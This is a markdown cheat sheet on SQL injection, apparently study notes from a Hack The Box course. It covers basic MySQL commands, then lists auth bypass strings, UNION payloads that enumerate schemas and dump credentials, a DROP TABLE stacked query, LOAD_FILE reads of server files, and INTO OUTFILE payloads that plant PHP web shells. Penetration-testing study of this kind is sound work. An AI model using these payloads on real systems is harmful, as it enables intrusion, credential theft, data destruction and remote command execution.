# SQL Injection

## Types of SQL Injection

| Type | Description | Example | Useful/Where Can't Be Used |
|------|-------------|---------|----------------------------|
| Classic | Direct injection into input fields | `' OR '1'='1` | Useful for basic input fields; can't use if input is sanitized |
| Union-Based | Uses UNION operator to extract data | `' UNION SELECT NULL, username, password --` | Useful with multiple columns; can't use if UNION is blocked |
| Error-Based | Exploits database errors to reveal data | `' AND 1=(SELECT COUNT(*))` | Useful with error messages; can't use if errors are suppressed |
| Blind (Boolean)| Infers data via true/false responses | `' AND SUBSTRING(version(), 1, 1)=5` | Useful when errors are suppressed; can't use if responses are identical |
| Blind (Time-Based) | Delays response based on conditions | `' OR IF(1=1, SLEEP(5), 0)` | Useful with no output; can't use if timing controls are strict |
| Stacked Queries | Executes multiple statements | `'; DROP TABLE users; --` | Useful if multi-queries allowed; can't use if DBMS restricts it |

## Useful links

- [MySQL Documentation](https://dev.mysql.com/doc/)
- [Data types](https://dev.mysql.com/doc/refman/8.0/en/data-types.html)
- [MariaDB Documentation](https://mariadb.com/docs/server)

## MySQL

### General

| Command | Description |
|---------|-------------|
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | Login to mysql database. No space after -p when entering password |
| `CREATE DATABASE users;`| Create a new datase called users |
| `SHOW DATABASES;` | List available databases |
| `USE users;` | Switch to database |

**Note:** SQL statements are not case sensitive but names are.

**Note:** 3306 is the default port for MySQL.

### Tables

| Command | Description |
|---------|-------------|
| `CREATE TABLE logins (id INT, ...);` | Add a new table |
| `SHOW TABLES;` | List available tables in current database |
| `DESCRIBE logins;` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..);` | Add values to table, requires values for all columns in the table |
| `INSERT INTO table_name(username, password) VALUES ('john', 'john123!');` | Add values to specific columns in a table **Note:** skipping columns with the 'NOT NULL' constraint will result in an error (unless AUTO_INCREMENT) |
| `INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');` | Insert multiple records at once by separating them with a comma |
| `UPDATE logins SET password = 'change_password' WHERE id > 1;` | Update specific records |

#### Create table example

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT, -- set to auto increment
    username VARCHAR(100) UNIQUE NOT NULL, -- must be unique and cannot be left blank
    password VARCHAR(100),
    date_of_joining DATETIME DEFAULT NOW(), -- default value will be when the entry is added
    PRIMARY KEY (id) -- makes the id column the primary key
    );
```

### Columns

| Command | Description |
|---------|-------------|
| `SELECT * FROM table_name;` | Show all columns in a table |
| `SELECT username, password FROM table_name;` | Show specific columns in a table |
| `DROP TABLE logins;` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT;` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE;` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn;` | Delete column |

### Output

| Command | Description |
|---------|-------------|
| `SELECT * FROM logins ORDER BY password;` | Sort by column (ascending by default) |
| `SELECT * FROM logins ORDER BY password DESC;` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY password DESC, id ASC;` | Sort by two-columns, by id for duplicate password entries |
| `SELECT * FROM logins LIMIT 2;` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2;` | Only show first two results starting from index 2 (1 being the offset in this example) |
| `SELECT * FROM logins WHERE id > 1;` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%';` | List results where the name is similar to a given string |
| `SELECT * FROM logins WHERE username like '___';` | Where username is exactly 3 chars, '_' = 1 char |
| `SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';` | Last name of the employee whose first name starts with Bar and was hired on 1990-01-01 |
| `SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';` | The number of all records where the employee number is greater than 10000 or the employee title does not contain the string engineer |

### MySQL Operator Precedence

- Division (/), Multiplication (*), and Modulus (%)
- Addition (+) and Subtraction (-)
- Comparison (=, >, <, <=, >=, !=, LIKE)
- NOT (!)
- AND (&&)
- OR (||)

## SQL Injection

### Example MySQL query in php

**Query:**
```php
$conn = new mysqli("localhost", "root", "password", "users");
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

**Printing results:**
```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

For the above example entering `1'; DROP TABLE users;--` would result in:

```sql
select * from logins where username like '%1'; DROP TABLE users;--'
```

### Types of Injection

| Type                | Description                              | Use Case                        |
|---------------------|------------------------------------------|---------------------------------|
| In-band: Union-Based| Direct output via UNION query in specific column | When output is displayed in a readable column |
| In-band: Error-Based| Triggers SQL errors to reveal query output | When errors are shown on front-end |
| Blind: Boolean-Based| Uses true/false conditions to infer data | When no output but page behavior changes |
| Blind: Time-Based   | Delays response with Sleep() to infer data | When no output or behavior change, but delays detectable |
| Out-of-band         | Sends output to remote location (e.g., DNS) | When no direct output is accessible |

**Note:** In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

###  SQL Injection Payloads URL Encoding

| Payload | URL Encoded |
|---------|-------------|
| '       | %27         |
| "       | %22         |
| #       | %23         |
| ;       | %3B         |
| )       | %29         |
| -       | %2D         |
| =       | %3D         |

### Auth Bypass Payloads

MySQL evaluates AND before OR, so a query with an OR and a TRUE condition (e.g., `'1'='1`) returns TRUE. Use `admin' or '1'='1` to bypass authentication by ensuring the query evaluates to TRUE while balancing quotes.

| Payload            | Description                     | How It Works                                   |
|--------------------|---------------------------------|------------------------------------------------|
| `'` | Single quote SQLi check | May return error message | useful to see if vulnerable to SQLi |
| `admin' or '1'='1` | Basic Auth Bypass (works if admin is a valid username) | Appends TRUE condition (`'1'='1`) to bypass login check |
| Username:`notadmin' or '1'='1` Password: `something' or '1'='1` | Basic Auth Bypass (works when username not known) | This works since the query evaluate to true irrespective of the username or password |
| `admin')-- -`      | Basic Auth Bypass With Comments | Closes query early with `)` and comments out rest with `--`, the additional ` -` ensures the comments are activited by forcing a space after them |

[Payload all the things: authentication bypass section](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

**Note:**  Line comments with `--` or `#`, in-line comment with `/**/`.

### Union Injection

[Union Clause](https://dev.mysql.com/doc/refman/8.0/en/union.html)

| Payload | Description |
|---------|-------------|
| `' order by 1-- -` | Detect number of columns using order by, increment the integer until error states column does not exist |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection, try a different numbers of columns until we get a success, using numbers as junk data will show which columns are displayed, however data type must match, NULL matches all data types |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection to show DB version, with 'cn' as search query | 
| `' UNION SELECT 1,user(),3,4-- -` | Basic Union injection to show which user we are making the query as | 
| `' UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns to get username from the passwords table |

### DB Enumeration

#### MySQL Fingerprinting

| Payload          | When to Use                  | Expected Output                           | Wrong Output                              |
|------------------|------------------------------|-------------------------------------------|-------------------------------------------|
| `SELECT @@version` | Full query output            | MySQL Version (e.g., 10.3.22-MariaDB-1ubuntu1) | MSSQL returns MSSQL version; errors in others. |
| `SELECT POW(1,1)`  | Numeric output only          | 1                                         | Errors in other DBMS.                     |
| `SELECT SLEEP(5)`  | Blind/No output              | Delays response 5 seconds, returns 0      | No delay in other DBMS.                   |

| Payload | Description |
|---------|-------------|
| `cn' UNION select 1,database(),3,4-- -` | Current database name  |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases (mysql, information_schema and performance_schema are default MySQLdatabases ) |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |

### Privileges

| Payload | Description |
|---------|-------------|
| `cn' UNION SELECT 1, user(), 3, 4-- -` or `cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if "root" user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Show all of the "root" user's privileges, "FILE" privilege allows the user to read files |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL. If "variable_value" is empty then we can read/write files to any location |

#### Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

- User with FILE privilege enabled
- MySQL global secure_file_priv variable not enabled
- Write access to the location we want to write to on the back-end server

### File Injection

| Payload | Description |
|---------|-------------|
| `cn' UNION SELECT 1, LOAD_FILE(LOAD_FILE("/etc/nginx/sites-enabled/default"), 3, 4-- -` | Read local file (find site root) |
| `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -` | Another read local file example, useful to see how backend queries are handled |
| `cn' UNION select 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -` | Write a string to a local file |
| `cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
| ```abc')+union+select+1,2,'<?=`$_GET[0]`?>',4+INTO+OUTFILE+'/var/www/html/shell.php'--+-``` | URL encoded workaround for writing a web shell to the base web directory |

**Note:** Web shells must be written to the base web directory for the web server (i.e. web root). Use load_file to read the server configuration at /etc/apache2/apache2.conf, /etc/nginx/nginx.conf or %WinDir%\System32\Inetsrv\Config\ApplicationHost.config are a few examples. Could also run a fuzzing scan and try to write files to different possible web roots, using [Linux wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [Windows wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). We can also use server errors to possibly display the web root.